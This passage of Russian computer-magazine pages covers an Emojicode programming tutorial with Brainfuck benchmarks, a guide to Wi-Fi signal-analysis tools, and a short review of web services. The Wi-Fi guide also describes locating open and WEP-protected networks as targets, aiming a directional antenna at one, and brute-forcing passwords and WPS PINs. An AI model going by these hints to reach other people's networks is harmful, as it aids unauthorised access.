разделить собаку (текущую строку) на части по значению @было, а затем пере-
даем получившийся список и значение @стало инициализатору строк десерт.
Десерт собирает из его элементов новую строку, ставя между ними @стало,
подобно join в Python.





Последний рывок. Во-первых, дополняем подсолнух методом шестерен-
 ка (:gear:), который выдает короткое название эмодзи в распространенном
формате, поддерживаемом, среди прочего, в GitHub, YouTube и Slack: двоето-
чия по краям и прочерки вместо пробелов.





Во-вторых, вставляем в книги палитру, которая заменяет в строке @исход-
ный-текст короткие названия эмодзи на соответствующие им символы (они
лежат в переменной список). Подробный разбор кода вряд ли необходим.
В нем не осталось ни одного значка, о смысле которого мы еще не говорили.
   Код клетчатого флажка, который использует эти классы для выполнения ре-
альной работы, можно и пропустить: он прост и очевиден. На основе файла
 emoji.txt (txt) создается экземпляр книг. Своей палитрой он перерабатывает
содержимое файлов, названия которых перечислены в командной строке. Ре-
 зультат сохраняется в файлах с расширением .emojic и отдается на рассмо-
трение компилятору.
   Подробности — в файлах codes.emojic и emo.emojic, которые прилагаются
 к статье.





   emo.emojic и его текстовый аналог, в котором вместо эмодзи указаны их короткие названия
PCZONE
ВИНОГРАД
БЕЗУМИЯПРОГРАММИРУЕМ БЕЗ БУКВ
НА EMOJICODE



ПРОТОКОЛ НА ВЕЛОСИПЕДИСТА
Мы выяснили, как создавать классы. Мы знаем, как описывать переменные
и создавать методы. Мы видели циклы (по крайней мере, некоторые) и усло-
 вия. Мы даже примерно представляем, зачем нужны конфеты. Со многими
другими языками программирования таких познаний хватило бы на всю жизнь.
В случае эмодзикода это, к сожалению, только начало.
   Документация языка сообщает, что он, помимо всего прочего, поддержива-
 ет дженерики, замыкания (closures) и протоколы. Хуже того — пока я добирал-
ся до этого абзаца, вышла новая версия, которая поддерживает метаклассы.
Это пугает: автор эмодзикода плодит новую функциональность быстрее, чем
пишется статья. Всего нам точно не объять, но давай сделаем хоть что-то.
   В следующем примере мы будем использовать сделанные на прошлом эта-
пе классы подсолнух и книги. Если у нас уже есть список эмодзи, логично до-
бавить к нему удобный интерфейс, позволяющий искать значки по названию.
С ним будет проще подбирать эмодзи для классов и методов.
   Есть масса легких способов перебрать список эмодзи и показать подходя-
щие. Но какой смысл в легких способах, если мы используем эмодзикод? Ни-
 какого. Наш способ будет не легким, а красивым: мы воспользуемся протоко-
лами, чтобы получить объект, который представляет собой отфильтрованное
отображение исходного списка.
   Протоколы позволяют декларировать ожидаемую функциональность клас-
 са. После этого одни классы смогут объявлять, что они поддерживают этот
протокол, а другие — требовать такой поддержки. Значения с протоколом
вместо типа могут быть равны объекту любого класса, который поддерживает
 этот протокол. Такой прием позволяет обойти жесткость сильной типизации,
не лишаясь ее надежности.
   В стандартной библиотеке присутствуют два протокола, связанных с ите-
рацией. Уже известный нам цикл :repeat_one: требует, чтобы перебираемый
объект поддерживал протокол цикла. Стандартные списки, которые мы пе-
ребирали, его поддерживают, но такой протокол может реализовать и любой
другой класс, в том числе самодельный. Тогда и его можно будет перебирать
при помощи цикла.
   Этим мы и займемся: добавим в книги метод нож (:knife:), который возвра-
щает подмножество словаря эмодзи, отфильтрованное по указанному в аргу-
менте слову, причем так, чтобы его можно было перебрать циклом.



В начале подключим описания классов подсолнух и словарь, сохраненные
в файле codes.emojic. Его загружает оператор свиток (:scroll:), действующий
по тому же принципу, что и include в си.





Класса велосипедист, который мы создаем этим методом, пока не существу-
 ет, но сейчас мы его определим.





Видишь крокодила? Это он — декларатор поддержки протокола. Строчка
с крокодилом в описании класса гарантирует, что велосипедист удовлетворя-
 ет требованиям протокола цикла. Ракушка и подсолнух, указанные после него,
означают, что перебираемые элементы будут подсолнухами.
   Согласно документации, протокол цикла требует, чтобы в классе был ме-
тод данго (:dango: — что-то вроде шашлыка из рисовых шариков). Этот метод
должен возвращать итератор, то есть объект класса, удовлетворяющего дру-
гому стандартному протоколу — данго.
   В велосипедисте мы сохраняем ссылку на словарь и слово для фильтрации
 (это происходит в инициализаторе колокольчик). Обещанный протоколом ме-
тод данго создает объект класса велосипед и передает ему эти данные. Вело-
сипед — это наш итератор. Сейчас мы им займемся.





Крокодил подсказывает нам, что велосипед обязуется соответствовать прото-
колу данго с элементами типа подсолнух. Для этого классу необходимы два
метода: стрелка вниз (:arrow_down_small:), которая возвращает один элемент
и переходит к следующему, и вопросительный знак (:question:), проверяющий,
не пора ли заканчивать перебор.
   Основную работу выполняет метод бегун (:runner:). Он нам нужен, потому
 что в переменной словарь лежит полный список эмодзи. Мы же хотим полу-
 чить только те из них, в названии которых упомянуто искомое слово. Бегун уве-
личивает текущую позицию в списке (переменная индекс), пока не встретит
элемент, удовлетворяющий этому критерию.
   Наша версия протокольного метода стрелка вниз использует бегуна
для того, чтобы перейти к следующему подходящему элементу. За счет этого
она возвращает только элементы с нужным словом в названии.
   Бегун дает нам возможность воочию увидеть несколько конструкций эмод-
зикода, которые мы пока что не встречали: условное присваивание, проверку
«ничего» и еще одну разновидность цикла — :repeat: (такой цикл повторяется
до тех пор, пока выражение истинно).





Условное присваивание, как и обычное условие, начинается с мандарина,
но вместо выражения за ним следует оператор присвоения — мороженое.
   Вот что происходит в этой строчке. Сначала мы свиным пятачком вытаски-
ваем из списка элемент с порядковым номером индекс. Пятачок не уверен,
что в списке действительно есть элемент с таким номером, и потому возвра-
щает его в обертке. Это позволяет ему выдать «ничто», если индекс окажется
неверным. Мандарин, получив конфету, разворачивает ее и проверяет значе-
 ние. Если в обертке что-то есть, он сохраняет результат в переменной с на-
званием эмодзи, а затем запускает прилагающийся блок кода.
   Следующий мандарин — это не условное присваивание, а обычное усло-
 вие, но оно тоже имеет дело с пустотой. Облако (:cloud:) разворачивает кон-
феты и проверяет, что внутри. В отличие от пива, оно не передает извлеченное
значение дальше, а возвращает истину, если в обертке было ничто. В данном
случае облако проверяет, нашла ли лупа (:mag:) слово в ярлыке эмодзи. Когда
найти не удается, лупа возвращает ничто. Это вызывает срабатывание облака,
но его значение инвертирует зеленый крестик (:negative_squared_cross_mark:).
В итоге условие выполняется только в том случае, если лупа что-то нашла. Это
 значит, что бегун достиг цели. Яблоко с молнией (:zap:) помогают нам немед-
ленно покинуть метод.
   Вот и все. Остался только клетчатый флажок, но там все предсказуемо. По-
смотрим только, как работает созданный нами итератор.





В первой строчке мы создаем экземпляр книг и загружаем туда содержимое
файла emoji.txt. При помощи ножа отрезаем от списка-эмодзи велосипеди-
ста с фильтрацией по слову. Поскольку велосипедист поддерживает соот-
ветствующий протокол, цикл знает, как отобрать у него велосипед. Он дерга-
ет его за данго и дальше едет на полученном велосипеде, выуживая элемент
за элементом и сохраняя их в переменной эмодзи. В теле цикла мы вызываем
ухмылку для каждого из элементов, и она выводит соответствующие символы
и текстовое описание. Таким образом, мы получаем на экране список значков,
в описаниях которых присутствует искомое слово.
   Целиком исходный код утилиты можно найти в файле find.emojic. Если ты
его освоил, то знаешь об эмодзикоде почти все. Кроме, возможно, замыканий.
Но без замыканий вполне можно обойтись. Я советую поступить именно так.





                      Компиляция и применение утилиты find.emojib для поиска эмодзи



BRAINFUCK И ТАЙНА ЭМОДЗИКОДА
Наш коронный номер — интерпретатор легендарного языка программирова-
ния Brainfuck, написанный на эмодзикоде. Это неплохой бенчмарк. Сравнив
скорость работы нашего интерпретатора с вариантами Brainfuck на других
 языках, мы сможем оценить производительность эмодзикода. Быстрее ли он,
чем Python? Чем Java? Чем си, наконец?
    Brainfuck известен своей примитивностью. В нем нет ни объектов, ни функ-
 ций, ни переменных. Весь язык состоит из восьми простейших команд и одно-
 го указателя. Команды + и - увеличивают или уменьшают содержимое ячейки
памяти, которая находится по лежащему в указателе адресу. Чтобы сдвинуть
 указатель на одну ячейку в ту или другую сторону, служат команды < и >. Точ-
 ка и запятая записывают или считывают один символ из стандартных потоков
ввода-вывода. Две оставшиеся команды, [ и ], заменяют циклы и условные
переходы. Заключенный между ними блок кода повторяется до тех пор, пока
значение ячейки памяти по указателю не станет равно нулю.
   Такая простота — это сразу и плюс и минус. С одной стороны, нам же мень-
ше работы. Основной цикл интерпретации Brainfuck нетрудно уместить в два
десятка строк эмодзикода. Все, что требуется, — перебирать символы про-
граммы и выполнять соответствующие им команды. С другой стороны, про-
граммирование на таком языке — это сущий ад. Посуди сам — вот версия
 Hello World на Brainfuck.

++++++++[>+++++++++<-]>.<+++++[>++++++<-]>-.+++++++..+++.<
++++++++[>>++++<<-]>>.<<++++[>------<-]>.<++++[>++++++<-]>
.+++.------.--------.>+.

К свиньям, винограду и мандаринам эмодзикода так или иначе, но можно при-
 выкнуть. Привыкнуть к Brainfuck нельзя. К счастью, нам это и не нужно. Мы вос-
пользуемся тем, что сочинили другие. Чаще всего производительность интерпре-
таторов тестируют при помощи программы mandel.b: это почти 12 тысяч команд,
которые рисуют самый известный фрактал — множество Мандельброта.





                                   Программа mandel.b, написанная на Brainfuck, ри-
                                         сует фрактал, но делает это очень-очень медленно


Даже с таким простым языком лобовой подход не очень эффективен. Про-
стенький интерпретатор Brainfuck на си, найденный в интернете (bfi.c), тра-
 тит на mandel.b почти десять минут. Перевод на эмодзи замедлил его до та-
кой степени, что за два часа он закончил не больше четверти фрактала. Это
не производительность, а слёзы.
   Нужно действовать умнее и перед запуском программы составить табли-
цу соответствий между открывающими и закрывающими скобками ([ и ]). Тог-
да не придется искать точку перехода всякий раз, когда исполнение доходит
до одной из них. Попутно можно пересчитать повторяющиеся инкременты
и декременты (+, -, < и >), чтобы потом исполнять их за один шаг.
   Команды эмодзикода поместим в список code, а соответствующие им
данные (точки перехода для скобок и количество повторов для инкремента
и декремента) — в список args. Вот как выглядит получившийся цикл интер-
претации Brainfuck на эмодзикоде. Справа для понятности приведен соответ-
ствующий код на Python.





Список tape изображает область памяти Brainfuck, адресуемую указателем xc.
Текущую позицию в программе (то есть в списках code и args) хранит пере-
менная pc.
   Это помогло: интерпретатор Brainfuck заработал в несколько раз быстрее
и победил Мандельброта за 74 минуты (со свертыванием повторяющихся опера-
ций — 38 минут). Это быстрее, чем идентичный код на Python, для которого реше-
ние этой задачи растягивается на 144 минуты (со свертыванием — 47 минут).
   Если производительности интерпретатора не хватает, нужен компилятор:
 скрипт, который пройдет по программе на Brainfuck и для каждой команды вы-
даст соответствующую строчку кода на интересующем нас языке — хоть на си,
 хоть на Python, хоть на Emojicode. Получившиеся исходники можно скормить
соответствующим языкам, и пусть они разбираются.





Результат оказался таким удачным, что, возможно, с этого следовало начи-
 нать. Mandel.b, перекомпилированный в си, нарисовал множество Мандель-
брота всего за 29 секунд (6,9 секунды со свертыванием). Java и JavaScript при-
мерно в пять раз медленнее: 90 (36) секунд для Java и 119 (47) для JavaScript.
Эмодзикод пришел к финишу почти наравне с Ruby: 338 (165) секунд у Ruby
и 371 (268) у Emojicode. Python отработал свое в три раза медленнее, чем
 Emojicode: 1129,9 (401) секунды.





Любопытно, что при сравнении с другим бенчмарком, программой bench.b,
разрыв между Python и Emojicode не так велик: 855,4 против 864,7 секунды.
Разница, судя по всему, в том, что в mandel.b лишь около 20% шагов испол-
нения — это операции с ячейками памяти (список tape). В bench.b на них при-
ходится почти 50% шагов. Из этого можно сделать вывод, что работа со спи-
сками — это слабое место эмодзикода, существенно уменьшающая его
производительность.

Ошибки эмодзикода

Нетрудно догадаться, что эмодзикод не пользуется особой популярностью.
Есть серьезные подозрения, что до этой статьи никто не писал столько кода
на этом языке. И уж точно не получал за это деньги! Быть первопроходцем
тяжело. Бороться пришлось не только со своими ошибками, но и с тем, что
натворил создатель языка.
   Одна из ошибок эмодзикода попалась при портировании Brainfuck. И ка-
 кая! Для нейтрализации таких ошибок, если верить комиксу XKCD, весь проект
лучше уничтожить огнем. Она касалась словарей — стандартной коллекции
эмодзикода, где ключами служат строки, а не порядковые номера, как в спи-
 сках. Оказалось, что в определенных условиях при сохранении в словарь зна-
чения с одним ключом меняются значения сразу нескольких элементов с дру-
гими ключами. Именно поэтому в статье упоминаются списки, а о словарях
ни слова.
   Когда статья уже была готова, я пожаловался на странное поведение сло-
варей автору эмодзикода. Он быстро согласился, что происходит что-то
странное, и примерно через час нашел источник проблемы. Недоставало од-
ной строчки.





Впечатляющими ошибками дело не ограничивается: изрядная доля функцио-
нальности, которую обещает документация эмодзикода, попросту не работа-
 ет. Это, в частности, относится к методу для построчного чтения файлов. Он,
вопреки обещаниям, ничего не делает и молча возвращает «ничто». Еще два
нарушителя — пингвин и лошадиная голова. Это методы, которые, согласно
документации, должны добавлять в список указанное количество элементов.
Должны, но не добавляют. Прискорбнее всего, что единственный способ уз-
нать об этом, — собственный печальный опыт и чтение исходников.



Конец уже близок, а мы так и не получили ответов на многие вопросы. Зачем
автор эмодзикода это делает? По какой невообразимой причине растекаются
значения в словарях? Почему медведь? Несмотря ни на что, знакомство с этим
языком программирования нельзя назвать совсем уж неприятным (стокгольм-
ский синдром — сильная вещь). Он почти забавен. Но стоит ли упоминать его
в резюме? Еще один вопрос, и в такой неподходящий момент.
   Но есть и ответы. Вот главный: я наконец понял, чем должна кончаться эта
 статья.
   Арбуз.
PCZONE
 WI-FIПО МАКСИМУМУКАК УЛУЧШИТЬ КАЧЕСТВО СВЯЗИ
БЕЗ ДОПОЛНИТЕЛЬНЫХ ЗАТРАТ





                                         84ckf1r3
                                        84ckf1r3@gmail.com





Беспроводная связь редко радует скоростью и стабиль-
ностью, особенно если хотспот расположен за пару ком-
нат или (кхе-кхе!) в другой квартире. Практика показыва-
ет, что для повышения уровня сигнала не всегда нужно
покупать новое оборудование. Достаточно выполнить
хотя бы поверхностный анализ радиоэфира, и недостатки
твоей конфигурации Wi-Fi станут очевидны. Обнаружить
и устранить их помогут описанные в этой статье утилиты.

NETSPOT ДЛЯ OS X И WINDOWS
В этом году для Windows вышел популярный маковский анализатор беспрово-
дных сетей NetSpot. Это чисто разведывательная утилита: с ней нельзя инжек-
тировать пакеты, отправлять команды deauth и проводить аудит безопасности,
но она облегчает предварительный сбор данных и настройку точек доступа Wi-
Fi. Главная ее фишка — это красивая визуализация уровня сигнала. С NetSpot
ты можешь исследовать эфир в режиме мониторинга на базовой частоте 2,4
или 5 ГГц, анализировать зашумленность конкретного канала и строить ин-
формативные карты покрытия. Сейчас я покажу, как это делать.

СОСТАВЛЯЕМ КАРТУ WI-FI С NETSPOT
Для начала нужно выбрать режим Survey и загрузить карту помещения. Ее
можно начертить в любой программе и экспортировать как картинку или PDF
(из него будет взята только первая страница). Простую карту ты можешь нари-
совать прямо в NetSpot — она сохранится с расширением netspm. Но пользо-
ваться этим редактором можно разве что в крайнем случае — слишком уж он
неуклюжий. В нем даже нельзя менять свойства уже начерченных фигур — при-
ходится удалять их и создавать заново. К тому же в бесплатной версии нет
автосохранения. Одно неловкое движение — и почти готовую карту придется
делать заново.
  Чем более детальную карту ты используешь, тем точнее NetSpot определит
проблемные зоны. Я, к примеру, легко раздобыл планировку своего рабочего
помещения. Планы типовых жилых домов ты можешь найти в интернете, а мне
пришлось прогуляться в архивный отдел. Если ни то, ни другое для тебя не ва-
риант, то нарисуй карту в любом удобном векторном редакторе. Разработчи-
ки рекомендуют использовать изображения размером от 800 x 600 до 3000 x
2000 точек. При необходимости можно разбить большое помещение на от-
дельные фрагменты и загружать их как новые зоны.
  В итоге не важно, как ты получишь карту, — главное, чтобы были соблюдены
пропорции. Масштаб при этом знать не обязательно, можно просто отметить
любые две точки и указать расстояние между ними в метрах. Например, я точно
знаю, что в нашем здании любая внешняя стена имеет длину 281,05 метра.





                                             Загружаем карту и задаем масштаб

Однако мне вовсе неохота бегать с ноутбуком по периметру и объяснять цель
визита в каждом отделе, на территорию которого придется зайти. Поэтому
для нашего примера ограничимся только одним залом, который отмечен крас-
ным. В нем стена справа от двери имеет длину 55,3 метра. Примем это рас-
стояние как указание масштаба на новой карте и начнем сканирование.





                                                   Используем фрагмент карты

Проводить мониторинг лучше с тем адаптером Wi-Fi, который планирует-
ся использовать в дальнейшем. То же самое и с сетями: выбирай только те,
к которым у тебя есть доступ (или скоро будет). Обычно я ловлю около полу-
сотни точек доступа (AP) со своего рабочего места, но сейчас выберу только
одну — ту, к которой подключаюсь чаще всего. При необходимости по резуль-
татам теста можно будет изменить ее физическое расположение и настройки.
   Сейчас этот роутер стоит на стеллаже почти в самом центре зала. Смо-
трится такое решение не особенно эстетично, да и на рабочих местах у две-
ри связь откровенно паршивая. Попробуем найти этим жалобам объективное
подтверждение.
  Я выбрал пять точек на периферии плюс одну контрольную в центре зала,
но на самом деле их может быть сколько угодно. Берем ноутбук, запускаем
NetSpot и переходим с места на место, отмечая каждое из них на карте. В ка-
ждой точке ждем секунд по пять, пока замеряются уровни сигнала разных AP.
В каком направлении от тебя будет роутер, скорее всего, неважно. Большин-
ство встроенных и внешних антенн Wi-Fi — всенаправленные. По окончании
процедуры жмем Stop scan и получаем наглядную визуализацию результатов.





                                                       Первый тест Wi-Fi

Полученная «тепловая карта» показывает условными цветами соотношение
сигнал/шум в каждой точке помещения. Красный соответствует идеальной
связи, а фиолетовый — едва возможной. Как видно на скриншоте, у нас при-
емлемое качество связи только в центре зала. Сразу бросается в глаза, что
мощность сигнала везде слишком низкая. Даже рядом с роутером она ниже
среднего. С ним явно что-то не то.
   Беру стремянку и лезу к этой черной коробке. Сдув с нее сантиметровый
слой пыли, проверяю соединение всех антенн и меняю их положение. Поста-
вил их попрямее и повторил сканирование.





                                                        Результаты второго теста

Карта заиграла новыми цветами. Связь неидеальна, но явно стала лучше. Лю-
бая техника требует обслуживания — хотя бы элементарного. Из-за отраже-
ний сигнала от стен полученная картинка по форме далека от круга. В целом
она повторяет контуры помещения, но вот в зоне справа от двери затухание
сигнала слишком сильное. Там действительно есть проблемы. Попробуем пе-
реставить роутер.
   Найти новое место оказалось не так-то просто — в огромном зале баналь-
но нет свободных розеток и полок, а чтобы просверлить стены на работе, по-
требуется заполнять слишком много бумаг. Ради эксперимента я поставил ро-
утер на пол рядом с дверью.





Карта наглядно показывает, что на полу роутеру не место. Уверенного приема
при таком расположении нет вообще нигде. Выходит, высота имеет решающее
значение. Жаль, она не задается в NetSpot — все карты в программе плоские.
  В итоге оказалось, что изначальное расположение роутера было более-ме-
нее правильным. Если антенны не добивают до некоторых зон напрямую, зна-
чит, им просто не хватает мощности. Можно попробовать поднять роутер еще
выше, заменить антенны на имеющие больший коэффициент усиления и про-
верить настройки. Бывает, что мощность уменьшают программно. Если же ро-
утер уже работает на полную катушку и антенны достаточно мощные, а связь
все равно не ахти, остается только ставить репитеры. Подобрать их оптималь-
ное размещение снова поможет NetSpot.

Куда ставить роутер?

Большинство людей устанавливают точки доступа там, где их проще всего
разместить, — ставят на стол или убирают на шкаф. Антенны беспроводных
маршрутизаторов ориентируют как попало, а мощность ставят на произволь-
ное значение. Выбор канала почти всегда стоит на «авто», но автоматический
выбор часто не работает так, как должен. Все эти базовые параметры конфи-
гурации Wi-Fi сильно влияют на качество связи. Оценить их на глаз практиче-
ски невозможно.
   Единственный способ добиться от точки доступа качественной работы —
это подбирать ее расположение и настройки с учетом реальных результатов
мониторинга радиоэфира. Лучше не ограничиваться однократным сканиро-
ванием, а повторить его в другое время. Включившаяся во время обеденного
перерыва микроволновка или проснувшийся роутер в соседнем отделе могут
сильно изменить картину.


МОНИТОРИНГ C NETSPOT В РЕАЛЬНОМ ВРЕМЕНИ
Если надо улучшить связь в одном конкретном месте, то делать карту всего по-
мещения необязательно. Для этого у NetSpot есть мониторинг в режиме реаль-
ного времени. Уже через несколько секунд после запуска можно получить пред-
ставление об общей картине в эфире, а затем изучать ее более прицельно.
  Можно группировать найденные точки доступа по любому параметру, опре-
делять их физическое расположение и тип защиты, оценивать текущие уровни
сигнала в конкретном месте и их изменение во времени. Последнее особенно
актуально для поиска стабильных точек доступа.





                          Прерывистый график говорит о нестабильной связи с AP

За пару минут сканирования я нашел 54 хотспота в диапазоне 2,4 ГГц, но ста-
бильная связь возможна только с тремя из них. Более-менее ловятся еще во-
семь AP, а соединение с остальными возможно только при использовании
направленной антенны или мощного усилителя. Моя основная точка доступа
в таблице отсутствует. Дело в том, что NetSpot не показывает сети со скрытым
SSID. Добавить их вручную тоже нельзя.

ИЩЕМ APS СО СЛАБОЙ ЗАЩИТОЙ И ОПРЕДЕЛЯЕМ
НАПРАВЛЕНИЕ НА НИХ
Если подключиться в режиме Discover, легко найти и потенциальные цели
для атаки. Кликай на вкладку Security и увидишь список хотспотов, отсорти-
рованных по протоколу аутентификации. Среди них нашлась одна открытая
и двенадцать считай что открытых (WEP). Половина, правда, работает по не-
спешному 802.11g. При этом все плохо защищенные точки имеют очень сла-
бый сигнал. Достать их можно только мощным адаптером производства Alfa
Networks или направленной антенной, но стоит ли игра свеч?
  Выберем одну из точек с WEP-аутентификацией и попробуем дотянуться
до нее узким лучом. Для этого возьмем направленную антенну и будем мед-
ленно поворачивать ее. В NetSpot отметим нужную точку доступа в режиме
Discover и нажмем Details. При повороте антенны сигнал от выбранной точ-
ки будет то становиться сильнее, то вновь ослабевать. Иногда он пропадает
совсем. Через несколько минут сканирования направление на нее (или на то,
что отражает сигнал) определяется. Если использовать правильно ориентиро-
ванную направленную антенну, мощность сигнала вырастет. В моем случае —
с плачевных –96 дБм до приемлемых –59 дБм.





                                     Нашли хотспот направленной антенной

В общем, NetSpot с головой хватит для анализа качества сигнала Wi-Fi разных
точек доступа. А то, что можно поиграть в «охоту на лис», определяя, где нахо-
дятся неизвестные хотспоты, — это приятный бонус.

WIFI ANALYZER
NetSpot — это прекрасная штука, но схожие утилиты были и до него. Обычно
у них есть бесплатные версии, но с ограничениями или с рекламой. Наибо-
лее интересны утилиты для мобильных телефонов — просто потому, что та-
скать с собой ноутбук не всегда удобно. Для таких случаев я рекомендую WiFi
Analyzer. У этого приложения есть версия как для Windows 10, так и для Android.
   Бесплатная версия умеет делать почти все необходимое, но слегка надо-
едает рекламой. Версия Pro стоит 129 рублей. За эти деньги пользователь
не только избавляется от баннеров, но и получает расширенный набор функ-
ций: возможность подключиться к выбранной сети при клике на нее, исполь-
зование фильтров, изменение границ минимального и максимального уровня
сигнала и другие.
   Как я успел убедиться, WiFi Analyzer удобен именно на смартфоне или
планшете. Он помогает быстро найти наименее зашумленный канал и узнать
уровень сигнала в определенном месте. С его помощью легко проверить на-
стройки безопасности. В частности, можно узнать фактическое состояние
опции WPS. Она часто остается включенной, хотя в веб-интерфейсе роутера
и показана как неактивная.





                                        Точки доступа и их параметры безопасности


Всего у WiFi Analyzer пять режимов работы: график каналов, временной гра-
фик, рейтинг каналов, список точек доступа и измеритель сигнала. Все на-
звания говорят сами за себя. Первый график показывает, какие сети занима-
ют определенные каналы Wi-Fi. Всего по стандарту 802.11g их четырнадцать
в диапазоне 2,4 ГГц (с центральной частотой от 2412 до 2484 МГц), однако
законодательство везде разное. Если в Японии можно использовать все четы-
рнадцать каналов, то в России — первые тринадцать, а во Франции, к приме-
ру, — только четыре.





                                            График загруженности каналов Wi-Fi

Стандарт 802.11n позволяет к тому же объединять смежные каналы для уве-
личения пропускной способности. Этим часто пользуются, так что переходить
при плохой связи надо не на соседний канал, а хотя бы через один. Гаранти-
рованно не перекрываются первый, шестой и одиннадцатый. Поэтому обычно
лучший вариант — выбрать свободный канал из них.





                                              Рекомендации по выбору канала

Временной график показывает изменение мощности сигнала разных хотспо-
тов за время мониторинга. Он помогает определить нестабильные точки до-
ступа и скорректировать взаимное расположение антенн роутера и клиент-
ского устройства.





                               Определение стабильных AP на временном графике

На вкладке «рейтинг каналов» автоматически определяется лучший канал
и отображается таблица с рейтингом остальных. Чем больше звездочек, тем
лучше. Здесь же можно увидеть текущий канал. Если он не совпадает с тем,
который программа сочла лучшим, то стоит его сменить в настройках роутера.
   Список AP показывает все точки доступа, которые программа ловит в дан-
ный момент. Wi-Fi Analyzer может показывать все детали об используемом
протоколе аутентификации, включая тип шифрования. Для этого в настройках
надо отметить опцию «Показывать полный уровень безопасности». Тогда вме-
сто WPA2 можно увидеть, например, такую строку: WPA2-PSK-CCMP+TKIP WPS
ESS. Можно изучить соседей по эфиру, задружиться с открытыми или плохо за-
крытыми точками. Также в этом окне отображаются сведения о текущем под-
ключении, если оно есть: SSID сети, MAC- и IP-адреса.
   Последний режим предназначен прежде всего для поиска мертвых зон.
Выбираешь на отдельной вкладке одну точку доступа из списка и начинаешь
ее мониторить. Стрелка показывает текущее соотношение сигнал/шум и реа-
гирует на перемещение антенны. Можно ходить со смартфоном, как со счет-
чиком Гейгера, или крутить внешнюю направленную антенну.





                                             Определение уровня сигнала Wi-Fi

Если смотреть на экран при этом неудобно, то можешь включить звук — тогда
уровень сигнала будет озвучиваться пиканьем. Чем чаще пикает анализатор,
тем лучше связь в данный момент и в этом месте. В таком режиме можно хо-
дить по офису в поисках лучшего расположения рабочего места или или ис-
кать точки доступа при помощи направленной антенны.
   Когда стрелка в зеленой зоне, связь отличная. Уходит
в желтую? Можно попробовать что-то улучшить в конфи-
гурации Wi-Fi. Срывается в серую? Явно надо что-то ме-
нять. В первую очередь — размещение роутера и номер
канала.

                                   WWWACRYLIC WIFI HOME
Этот сканер Wi-Fi, созданный в Tarlogic Security, имеет                                                                           NetSpot — бесплатный
побольше возможностей, чем WiFi Analyzer, но все самое       анализатор Wi-Fi
интересное доступно только в платной версии. Програм-      для OS X и Windows
ма работает в Windows с 7 по 10, поддерживает диапа-                                                                                         Wi-Fi Analyzer
зоны 2,4 и 5 ГГц, стандарты 802.11b/g/n/ac, имеет свою         для Windows
систему плагинов и собственные драйверы для популяр-
                                                                          Бесплатная версияных Wi-Fi-адаптеров. Благодаря этому она может рабо-                                                                                               Acrylic WiFi Home
тать и как снифер, интегрируясь с Wireshark.
   Бесплатная версия не проводит атаки на точки досту-          MyPublicWiFi
                                                                       превращает любойпа и, по сути, пригодна только для пассивного сбора ин-
                                                                      комп в точку доступа
формации, как и рассмотренные выше утилиты. Однако                                                                                     Wi-Fi со снифером (хе-
в отличие от них она видит скрытые сети (без BSSID), что         хе) и файрволом
делает ее достойным инструментом разведки.





                                 Отображение параметров скрытых точек доступа

Если провести инвентаризацию (Menu    Inventory), то вместо MAC-адресов
известных устройств будет отображаться их описание из пользовательско-
го списка. Для неизвестных девайсов определяется только их производи-
тель. Сопоставление происходит через 24-битный номер OUI — уникальный
идентификатор организации, присваиваемый IEEE. Список OUI можно загру-
зить вручную или получить с сайта Tarlogic Security на главной вкладке раздела
«Конфигурация».





                              Обновление списка OUI и запрет отправки статистики


Платная версия умеет делать множество интересных вещей. Например, со-
хранять перехваченные пакеты в PCAP-файл, показывать известные пароли
и быстро перебирать неизвестные (например, по списку дефолтных значе-
ний производителя). Особенно полезна поддержка скриптов. С их помощью
можно автоматизировать большинство рутинных процессов вроде перебора
паролей по маске. Еще доступен перебор WPS PIN и расширенные функции
экспорта собранных данных.





                           Включение расширенных функций в бесплатной версии

Полнофункциональная версия обойдется недешево — 20 евро в год или 40
евро за бессрочную лицензию. На усмотрение разработчика некоторым сту-
дентам бесплатно выдается лицензия на профессиональную версию Acrylic
WiFi. Попытать счастья можно, заполнив анкету.
   Дополняет эту программу анализатор покрытия Acrylic WiFi Heatmaps, проб-
ную версию которого можно получить здесь. С ним Acrylic WiFi весьма напоми-
нает сканер NetSpot — принцип работы очень похожий.
PC ZONE





                                            Андрей Письменный
                                                      apismenny@gmail.com



       СЕРВИСЫ, КОТОРЫЕ ПРЕВРАТЯТ СТРОКУ ТЕКСТА В ШЕДЕВР
      И НАУЧАТ ТЕБЯ ЛИТСПИКУ
 1





                            Ты наверняка видел, как кто-нибудь в интернете пишет странны-
        ми разношерстными буквами из разных алфавитов, переворачива-
          ет строки или превращает текст в вырвиглазную кашу. Поверь, это
         несложно, и постигать темные секреты Unicode вовсе не обязатель-
           но. Достаточно всего лишь ссылки на нужный сервис.
           Начнем с утилиты Weirdmaker. Она позволяет вписать стро-
           ку латиницей и получить девять разных вариаций с заменами букв
         на схожие по начертанию, но из других алфавитов. Один из вари-
          антов — на литспике.





         У того же разработчика есть другая тулза, она предназначена
         для переворачивания строк. Но, увы, срабатывает она тоже толь-
          ко с латиницей, а кириллические строки просто пишет задом напе-
          ред. Для русского текста рекомендую сайт textinvert.ru.





         Если тебе нужно сделать максимально чумовой текст, то добро по-
         жаловать на Zalgo text generator. Вставляй исходник в поле ввода,
          отметь галочками направление глитчей (наверх, по центру и вниз)
         и выбери степень кошмарности («мини», «нормально» или «мак-
            си»). Кнопка HE COMES сгенерирует результат. Увы, копировать
          его куда-либо не предполагается, но ты можешь поэксперименти-
          ровать.





        Еще есть аналог, созданный неким stAllio. Он ориентирован на ко-
          роткие строки, зато в нем больше настроек. Чтобы воспользовать-
          ся им, впиши что-нибудь в поле Text и жми кнопки с буквами «а»
         до получения результата, который тебя устроит. Скопировать то,
          что получится, можешь из того же поля Text. Кириллица здесь под-
          держивается, но спецэффекты с ней менее художественные.





        HACKSPLAINING — ИНТЕРАКТИВНЫЕ УРОКИ ПО ВЗЛОМУ
       ВЕБ-САЙТОВ И ЕГО ПРЕДОТВРАЩЕНИЮ
              hacksplaining.com
 2





                            Как ты знаешь из чтения журнала «Хакер», видов уязвимостей
         не так уж много, и подходов к ним — тоже. Разработчики сайта
          Hacksplaining.com решили сделать полезное дело и каталогизиро-
          вать все уязвимости. Мало того — они сочинили наглядное объяс-
         нение к каждой.
            Начать лучше всего с регистрации — это вещь чисто симво-
          лическая, и можно, к примеру, войти через аккаунт Facebook или
           GitHub. Дело в том, что до входа доступны уроки всего по четырем
          уязвимостям, а после — по всем двадцати. Среди них: SQL-инъек-
          ции, разные виды XSS, XML-бомбы, эскалация привилегий, кликд-
          жекинг и так далее. Все они связаны с вебом — вскрытие бинарни-
          ков авторы сайта решили (пока что?) не рассматривать.
           Для каждой из уязвимостей указано, насколько она часто встре-
